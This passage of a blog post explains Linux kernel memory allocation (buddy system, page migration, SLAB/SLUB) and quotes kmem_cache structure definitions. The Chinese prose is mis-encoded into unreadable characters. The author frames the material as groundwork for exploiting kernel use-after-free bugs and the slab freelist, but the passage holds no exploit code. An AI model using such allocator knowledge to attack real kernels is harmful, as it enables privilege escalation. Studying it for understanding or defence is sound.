class="lvl-2"><p>å¦‚æœå¯¹åº”çš„é“¾è¡¨ä¸ºç©ºï¼Œå°±å‘ä¸‹ä¸€ä¸ªfree_areaå»è¯·æ±‚ï¼Œè¯·æ±‚åˆ°åä¸€åˆ†ä¸ºäºŒï¼Œè¿”å›ä¸€ä¸ªï¼Œå°†å¦ä¸€ä¸ªæ”¾è¿›ä¸Šé¢çš„é“¾è¡¨ã€‚å†ç©ºå°±ç»§ç»­å‘ä¸Šæ‰¾ã€‚</p></li><li class="lvl-2"><p>é‡Šæ”¾åè¿ç»­çš„å°±æ”¾åˆ°å¯¹åº”é“¾è¡¨ä¸Šï¼ˆbinï¼‰ï¼Œç©ºé—²çš„å°±åˆå¹¶å¾€æ›´é«˜å±‚æ”¾ã€‚</p></li></ul><p>è€Œå¤–éƒ¨ç¢ç‰‡çš„é—®é¢˜åªæ˜¯è¢«å¾ˆå¤§ç¨‹åº¦çš„å‡å¼±äº†ï¼Œè€Œå¹¶æ²¡æœ‰è¢«å®Œå…¨è§£å†³ï¼Œå†…æ ¸è¿˜ä¼šæ‰§è¡Œé¡µé¢è¿ç§»æ¥å‡å°‘ç¢ç‰‡ï¼Œä¸å†èµ˜è¿°ã€‚è¿™ä¸ªé¡µé¢è¿ç§»çš„å†…æ ¸æ¥å£æ˜¯å¾ˆå¤šåˆ«çš„åŠŸèƒ½çš„åŸºç¡€</p><blockquote><p><a href="https://blog.csdn.net/yhb1047818384/article/details/119920971">https://blog.csdn.net/yhb1047818384/article/details/119920971</a><br>å¯ä»¥å‘ç°ï¼Œ é¡µé¢è¿ç§»ä¸æ˜¯ç®€å•çš„æŠŠä¸€ä¸ªpageä»Aä½ç½®ç§»åŠ¨åˆ°Bä½ç½®ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ä¸€ä¸ªåˆ†é…æ–°é¡µé¢ï¼Œå°†æ—§é¡µé¢çš„å†…å®¹æ‹·è´è‡³æ–°é¡µé¢ï¼Œè§£é™¤æ—§é¡µé¢çš„æ˜ å°„å…³ç³»ï¼Œå¹¶å°†æ˜ å°„å…³ç³»æ˜ å°„åˆ°æ–°é¡µé¢ï¼Œæœ€åé‡Šæ”¾æ—§é¡µé¢çš„è¿‡ç¨‹ã€‚</p></blockquote><h1>Slab/Slub</h1><p><strong>è¿™æ˜¯æˆ‘ä»¬åˆ©ç”¨å†…æ ¸UAFè¦ä¸»è¦æŒæ¡çš„å†…å®¹</strong></p><p>slabæ˜¯è¿è¡Œäºbuddy systemä¹‹ä¸Šçš„ä¸€ä¸ªæ›´å°ç²’åº¦çš„å†…å­˜åˆ†é…ç³»ç»Ÿã€‚ç”¨äºè§£å†³å†…éƒ¨ç¢ç‰‡çš„é—®é¢˜ã€‚åƒfileå’Œtask_structç­‰ç­‰è¿™äº›é¢‘ç¹ä½¿ç”¨çš„å°ç»“æ„ä½“ï¼Œ ä¼™ä¼´ç³»ç»Ÿåªèƒ½æ¯æ¬¡ç”³è¯·è‡³å°‘ä¸€ä¸ªpage,æ˜¾ç„¶æ²¡æ³•æ»¡è¶³æˆ‘ä»¬è¿™ç§éœ€æ±‚ï¼Œslabå°±å‡ºç°äº†ã€‚</p><p>slabæ˜¯æœ€æ—©çš„ç‰ˆæœ¬ï¼Œè€Œè¿™ä¸ªç‰ˆæœ¬å¤ªå¤æ—©ä»¥è‡³äºæœ‰å¾ˆå¤šé—®é¢˜ï¼Œä¸€ä¸ªå¾ˆé‡è¦çš„é—®é¢˜å°±æ˜¯NUMAæ¶æ„çš„æ”¯æŒä¸å¥½ï¼ˆå°½ç®¡æˆ‘ä»¬ç°åœ¨éƒ½ç”¨çš„æ˜¯è¿™ä¸ªæ¶æ„ï¼‰ï¼Œéå¸¸è‡ƒè‚¿ã€‚å› æ­¤è¢«å¤§ç¥ä»¬ä¼˜åŒ–æˆäº†ç°åœ¨ç”¨çš„slubç³»ç»Ÿã€‚ä¿ç•™äº†åŸºæœ¬çš„æ€æƒ³æ¡†æ¶ï¼Œå¯¹å¾ˆå¤šç»†èŠ‚å’Œå®ç°åšäº†ä¼˜åŒ–ï¼ŒåŒ…æ‹¬æ”¾å¼ƒäº†ç€è‰²ç³»ç»Ÿï¼Œå¤šå¤„ç†å™¨å’ŒNUMAä¼˜åŒ–ç­‰ç­‰ã€‚ä½†æ˜¯linuxå†…æ ¸ä¸­ç›¸å…³çš„æ¥å£éƒ½ä»¥slabå‘½åï¼Œå¼€å‘è€…ä»¬ä¹Ÿéƒ½ä¿ç•™äº†è¿™äº›åç§°ï¼Œå› æ­¤ä¸‹é¢çš„slabå’Œslubå¾ˆå¯èƒ½ä¼šæ··ç”¨ï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œåˆ†è¾¨ã€‚</p><p>å¦å¤–ï¼Œslobåˆ™æ˜¯æ›´é’ˆå¯¹åµŒå…¥å¼ç³»ç»Ÿçš„ä¸€ä¸ªå†…å­˜åˆ†é…ç³»ç»Ÿ</p><blockquote><p>å‚è€ƒï¼šï¼ˆå¼ºçƒˆæ¨èï¼‰ï¼š<a href="https://segmentfault.com/a/1190000043626203#item-4">https://segmentfault.com/a/1190000043626203#item-4</a><br><a href="https://blog.csdn.net/qq_54218833/article/details/127218102">https://blog.csdn.net/qq_54218833/article/details/127218102</a></p></blockquote><h2 id="æ¦‚è¿°">æ¦‚è¿°</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥çœ‹slabçš„ä¸€ä¸ªç®€å•çš„æ¦‚è¿°ã€‚slabä»buddyç”³è¯·æ¥è¿ç»­çš„å†…å­˜é¡µåï¼ŒæŒ‰ç…§å¯¹è±¡çš„å¤§å°å°†å…¶æ± åŒ–æˆå¾ˆå¤šå°çš„/å†…å­˜å¯¹é½çš„å¯¹è±¡ã€‚å®ƒä»¬ç”¨kmem_cacheç®¡ç†ï¼Œé“¾æ¥åœ¨é“¾è¡¨ä¸Šï¼Œç„¶åå……åˆ†åˆ©ç”¨cpuç¼“å­˜å’Œç¨‹åºå±€éƒ¨æ€§æ¥è¿›è¡Œé«˜é€Ÿçš„åˆ†é…å’Œé‡Šæ”¾</p><blockquote><p>ä¸Šé¢è¿™æ®µå…¶å®æ˜¯å†™å®Œä¹‹åå›å¤´å†å†™çš„</p></blockquote><p>slabçš„ç®¡ç†å±‚çº§å¤§æ¦‚æ˜¯kmem_cache(slab_cache)-&gt;slab(freelist/pageframes)-&gt;objectçš„é€»è¾‘ï¼Œè¦å…·ä½“æŒæ¡slabæœºåˆ¶æ¯”è¾ƒéº»çƒ¦ï¼Œä¸‹é¢æŒ‰ç…§æ‹†è§£ç»„æˆï¼Œåˆ†é…ï¼Œé‡Šæ”¾ä¸‰ä¸ªéƒ¨åˆ†, ä»¥è‡ªé¡¶å‘ä¸‹çš„é€»è¾‘å¤§æ¦‚ä»‹ç»ä¸‹slabã€‚ï¼ˆå…¶å®è‡ªåº•å‘ä¸Šä¼šæ›´å¥½ç†è§£ä¸€äº›å…·ä½“çš„å®ç°ï¼‰</p><h2 id="æ‹†è§£ç»„ä»¶">æ‹†è§£ç»„ä»¶</h2><h3 id="kmem-cache">kmem_cache</h3><p>åœ¨slabä¸­ï¼Œå®ƒæ‰€ç®¡ç†çš„å†…å­˜åˆ†é…å•å…ƒç§°ä¸ºâ€œå¯¹è±¡â€(Object)ã€‚è€Œè¿™äº›slabåˆ™æ˜¯è¢«slab cacheæ‰€ç®¡ç†çš„slabæ± ï¼ˆå±‚å±‚æ± åŒ–ï¼Ÿï¼‰ï¼Œç”¨ä¸€ä¸ª<code>kmem_cache</code>ç»“æ„ä½“ç®¡ç†ã€‚<br>kmem_cacheæ˜¯ä¸€ä¸ªåˆ†é…å™¨ï¼Œå¯ä»¥ç†è§£æˆç±»ä¼¼main_arenaçš„ä¸œè¥¿ã€‚è€Œä»buddy systemæ¯æ¬¡å–æ¥çš„ä¸€ä¸ªæˆ–å‡ ä¸ªè¿ç»­çš„é¡µæ¡†è¢«ç§°ä¸ºä¸€ä¸ª<code>slab</code>ï¼Œslabåˆ†é…å™¨å°†æ¯ä¸ªslabæ‹†åˆ†æˆè‹¥å¹²å¯¹è±¡å‘ä¸‹ä¸€çº§è¿›è¡Œåˆ†é…ã€‚ä¸€ä¸ªkmem_cacheå¯¹åº”æŸä¸€ç§åŠŸèƒ½/å¤§å°çš„å¯¹è±¡åˆ†é…ï¼Œæ‰€æœ‰çš„kmem_cacheè¢«å­˜æ”¾åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ç®¡ç†ã€‚</p><p>slub kmem_cacheç»“æ„ï¼ˆ<strong>ç¼åˆäº†æºç å’Œå¤§ä½¬çš„éƒ¨åˆ†æ³¨é‡Šç‰ˆæœ¬ï¼Œä¸ä»£è¡¨ç»“æ„ä½“å®šä¹‰ï¼Œä»…ä¾›ç†è§£</strong>ï¼‰:</p><blockquote><p>éšæ‰‹å†™ä¸€ä¸‹ï¼ŒæŸ“è‰²ç³»ç»Ÿæ˜¯ä¸ºäº†è§£å†³å¤šCPU cacheç¼“å­˜ä¸åŒå¤§å°ä½†slabå†…ç›¸åŒåç§»å¯¹è±¡æ—¶ä¼šå¤„äºåŒä¸€è¡Œçš„é—®é¢˜æ‰€åˆ›ç«‹çš„ï¼Œä½†æ˜¯å¯èƒ½æ²¡ä»€ä¹ˆå¤ªå¤§ç”¨è¢«slubåˆ æ‰äº†</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span> <span class="comment">// å…³é”®å­—æ®µ</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// slab cache çš„ç®¡ç†æ ‡å¿—ä½ï¼Œç”¨äºè®¾ç½® slab çš„ä¸€äº›ç‰¹æ€§</span></span><br><span class="line">    <span class="comment">// æ¯”å¦‚ï¼šslab ä¸­çš„å¯¹è±¡æŒ‰ç…§ä»€ä¹ˆæ–¹å¼å¯¹é½ï¼Œå¯¹è±¡æ˜¯å¦éœ€è¦ POISON  æ¯’åŒ–ï¼Œæ˜¯å¦æ’å…¥ red zone åœ¨å¯¹è±¡å†…å­˜å‘¨å›´ï¼Œæ˜¯å¦è¿½è¸ªå¯¹è±¡çš„åˆ†é…å’Œé‡Šæ”¾ä¿¡æ¯ ç­‰ç­‰</span></span><br><span class="line">    <span class="type">slab_flags_t</span> flags;</span><br><span class="line">    <span class="comment">// slab å¯¹è±¡åœ¨å†…å­˜ä¸­çš„çœŸå®å ç”¨ï¼ŒåŒ…æ‹¬ä¸ºäº†å†…å­˜å¯¹é½å¡«å……çš„å­—èŠ‚æ•°ï¼Œred zone ç­‰ç­‰</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;  <span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">    <span class="comment">// slab ä¸­å¯¹è±¡çš„å®é™…å¤§å°ï¼Œä¸åŒ…å«å¡«å……çš„å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">    <span class="comment">// slab å¯¹è±¡æ± ä¸­çš„å¯¹è±¡åœ¨æ²¡æœ‰è¢«åˆ†é…ä¹‹å‰ï¼Œæˆ‘ä»¬æ˜¯ä¸å…³å¿ƒå¯¹è±¡é‡Œè¾¹å­˜å‚¨çš„å†…å®¹çš„ã€‚</span></span><br><span class="line">    <span class="comment">// å†…æ ¸å·§å¦™çš„åˆ©ç”¨å¯¹è±¡å ç”¨çš„å†…å­˜ç©ºé—´å­˜å‚¨ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„åœ°å€ã€‚</span></span><br><span class="line">    <span class="comment">// offset è¡¨ç¤ºç”¨äºå­˜å‚¨ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡æŒ‡é’ˆçš„ä½ç½®è·ç¦»å¯¹è±¡é¦–åœ°å€çš„åç§»</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;    <span class="comment">/* Free pointer offset */</span></span><br><span class="line">    <span class="comment">// è¡¨ç¤º cache ä¸­çš„ slab å¤§å°ï¼ŒåŒ…æ‹¬ slab æ‰€éœ€è¦ç”³è¯·çš„é¡µé¢ä¸ªæ•°ï¼Œä»¥åŠæ‰€åŒ…å«çš„å¯¹è±¡ä¸ªæ•°</span></span><br><span class="line">    <span class="comment">// å…¶ä¸­ä½ 16 ä½è¡¨ç¤ºä¸€ä¸ª slab ä¸­æ‰€åŒ…å«çš„å¯¹è±¡æ€»æ•°ï¼Œé«˜ 16 ä½è¡¨ç¤ºä¸€ä¸ª slab æ‰€å æœ‰çš„å†…å­˜é¡µä¸ªæ•°ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line">    <span class="comment">// slab ä¸­æ‰€èƒ½åŒ…å«å¯¹è±¡ä»¥åŠå†…å­˜é¡µä¸ªæ•°çš„æœ€å¤§å€¼</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">    <span class="comment">// å½“æŒ‰ç…§ oo çš„å°ºå¯¸ä¸º slab ç”³è¯·å†…å­˜æ—¶ï¼Œå¦‚æœå†…å­˜ç´§å¼ ï¼Œä¼šé‡‡ç”¨ min çš„å°ºå¯¸ä¸º slab ç”³è¯·å†…å­˜ï¼Œå¯ä»¥å®¹çº³ä¸€ä¸ªå¯¹è±¡å³å¯ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">    <span class="comment">// å‘ä¼™ä¼´ç³»ç»Ÿç”³è¯·å†…å­˜æ—¶ä½¿ç”¨çš„å†…å­˜åˆ†é…æ ‡è¯†</span></span><br><span class="line">    <span class="type">gfp_t</span> allocflags; </span><br><span class="line">    <span class="comment">// slab cache çš„å¼•ç”¨è®¡æ•°ï¼Œä¸º 0 æ—¶å°±å¯ä»¥é”€æ¯å¹¶é‡Šæ”¾å†…å­˜å›ä¼™ä¼´ç³»ç»Ÿé‡</span></span><br><span class="line">    <span class="type">int</span> refcount;   </span><br><span class="line">    <span class="comment">// æ± åŒ–å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œç”¨äºåˆ›å»º slab å¯¹è±¡æ± ä¸­çš„å¯¹è±¡</span></span><br><span class="line">    <span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">    <span class="comment">// å¯¹è±¡çš„ object_size æŒ‰ç…§ word å­—é•¿å¯¹é½ä¹‹åçš„å¤§å°</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inuse;  </span><br><span class="line">    <span class="comment">// å¯¹è±¡æŒ‰ç…§æŒ‡å®šçš„ align è¿›è¡Œå¯¹é½</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> align; </span><br><span class="line">    <span class="comment">// slab cache çš„åç§°ï¼Œ ä¹Ÿå°±æ˜¯åœ¨ slabinfo å‘½ä»¤ä¸­ name é‚£ä¸€åˆ—</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// info used for slab</span></span><br><span class="line"><span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸‰ä¸ªå­—æ®µå€¼å¾—æˆ‘ä»¬å…³æ³¨ï¼Œä¸€æ˜¯flagï¼Œé‡Œé¢æœ‰å¾ˆå¤šå„ç§å„æ ·çš„é…ç½®ä¿¡æ¯ä»¥åŠflag,æ¯”å¦‚æ˜¯å¦64å­—èŠ‚å¯¹é½ï¼Œæ˜¯å¦å¼€å¯slabæ¯’åŒ–ï¼Œæ˜¯å¦ç”¨red_zoneé˜²æ­¢OOB, æŒ‡å®šæ˜ å°„åŒºåŸŸæ¥è‡ªå“ªé‡Œï¼ˆé»˜è®¤éƒ½æ˜¯NORMALï¼‰ç­‰ç­‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Red zone objs in a cache */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_RED_ZONE  ((slab_flags_t __force)0x00000400U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Poison objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_POISON  ((slab_flags_t __force)0x00000800U)</span></span><br><span class="line"><span class="comment">/* Align objs on cache lines */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_HWCACHE_ALIGN ((slab_flags_t __force)0x00002000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA  ((slab_flags_t __force)0x00004000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA32 memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA32 ((slab_flags_t __force)0x00008000U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Store the last owner for bug hunting */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_STORE_USER </span></span><br></pre></td></tr></table></figure><p>äºŒæ˜¯å¼€å¤´çš„__percpuå˜é‡<br>6.11.5ç‰ˆæœ¬å†…æ ¸çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span> **freelist;   <span class="comment">// æŒ‡å‘è¢« CPU æœ¬åœ°ç¼“å­˜çš„ slab ä¸­ç¬¬ä¸€ä¸ªç©ºé—²çš„å¯¹è±¡</span></span><br><span class="line">            <span class="comment">// ä¿è¯è¿›ç¨‹åœ¨ slab cache ä¸­è·å–åˆ°çš„ cpu æœ¬åœ°ç¼“å­˜ kmem_cache_cpu ä¸å½“å‰æ‰§è¡Œè¿›ç¨‹çš„ cpu æ˜¯ä¸€è‡´çš„ã€‚</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">freelist_aba_t</span> freelist_tid;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// slab cache ä¸­ CPU æœ¬åœ°æ‰€ç¼“å­˜çš„ slabï¼Œ</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="comment">// cpu cache ç¼“å­˜çš„å¤‡ç”¨ slab åˆ—è¡¨</span></span><br><span class="line">    <span class="comment">// å½“è¢«æœ¬åœ° cpu ç¼“å­˜çš„ slab ä¸­æ²¡æœ‰ç©ºé—²å¯¹è±¡æ—¶ï¼Œå†…æ ¸ä¼šä» partial åˆ—è¡¨ä¸­çš„ slab ä¸­æŸ¥æ‰¾ç©ºé—²å¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="comment">// è®°å½• slab åˆ†é…å¯¹è±¡çš„ä¸€äº›çŠ¶æ€ä¿¡æ¯</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªcpuç¼“å­˜æ˜¯æˆ‘ä»¬åˆ†é…çš„ä¸»è¦æ¥æºã€‚ä¸»è¦æ˜¯é‡Œé¢ç¼“å­˜çš„ä¸€ä¸ªslabå’Œä¸€ä¸ªpartialåˆ—è¡¨ã€‚åé¢åœ¨åˆ†é…ä¼šè®²åˆ°ä»–ä»¬çš„ç”¨æ³•ã€‚freelistå°†ä¼šæˆä¸ºåç»­æˆ‘ä»¬pwnçš„å¯¹è±¡ä¹‹ä¸€ã€‚</p><p>æœ€åä¸€ä¸ªå­—æ®µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span><span class="comment">/* partial list first, better asm code */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> total_slabs;<span class="comment">/* length of all slab lists */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_slabs;<span class="comment">/* length of free slab list only */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_next;<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span><span class="comment">/* shared per node */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span><span class="comment">/* on other nodes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> next_reap;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="type">int</span> free_touched;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœä½¿ç”¨slabï¼Œæ¯ä¸ªkmemèŠ‚ç‚¹è¦ç®¡ç†ä¸‰ä¸ªåŒå‘é“¾è¡¨ï¼Œåˆ†åˆ«æ˜¯partial,fullå’Œfree.é¡¾åæ€ä¹‰ï¼Œpartialç®¡ç†æœ‰éƒ¨åˆ†ç©ºé—²å¯¹è±¡çš„slab,fullåˆ™ç®¡ç†å·²ç»å…¨éƒ¨è¢«åˆ†é…æ»¡çš„slabï¼Œfreeè¡¨ç¤ºå®Œå…¨ç©ºé—²çš„slab. è¿™ä¸‰ä¸ªé“¾è¡¨æ˜¯åŠ¨æ€è½¬åŒ–çš„ï¼Œæ ¹æ®å½“å‰çš„åˆ†é…æƒ…å†µå®æ—¶ç§»åŠ¨ã€‚å¹¶ä¸”freeå¤ªå¤šä¼šå‘buddyåˆå¹¶ã€‚</p><p>è€Œä½¿ç”¨slubçš„æ—¶å€™å°±ç›´æ¥åˆ é™¤äº†freeå’Œfullé“¾è¡¨ï¼Œåªä¿ç•™äº†partialã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡<code>cat /proc/slabinfo</code>æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„slab_cacheã€‚</p><h3 id="slab">slab</h3><p>ä»buddy systemå–æ¥çš„é¡µé¢è¢«æ‹†æˆä¸€å †objectæ”¾å…¥äº†freelistæ„æˆæˆ‘ä»¬çš„ä¸€ä¸ªå¯¹è±¡æ± ã€‚ç”¨è¿™æ ·ä¸€å¼ å›¾å¯ä»¥æ¯”è¾ƒå¥½çš„è¡¨ç¤ºï¼š</p><p><img src="/images/linux_mem/slab_struct.png" alt="slab1.png"></p><p>slabæ˜¯ç®¡ç†å†…å­˜åˆ†é…å’Œé‡Šæ”¾çš„åŸºæœ¬å•ä½ã€‚è‹¥å¹²ä¸ªslabä¹Ÿæ„æˆäº†ä¸€ä¸ªæ± 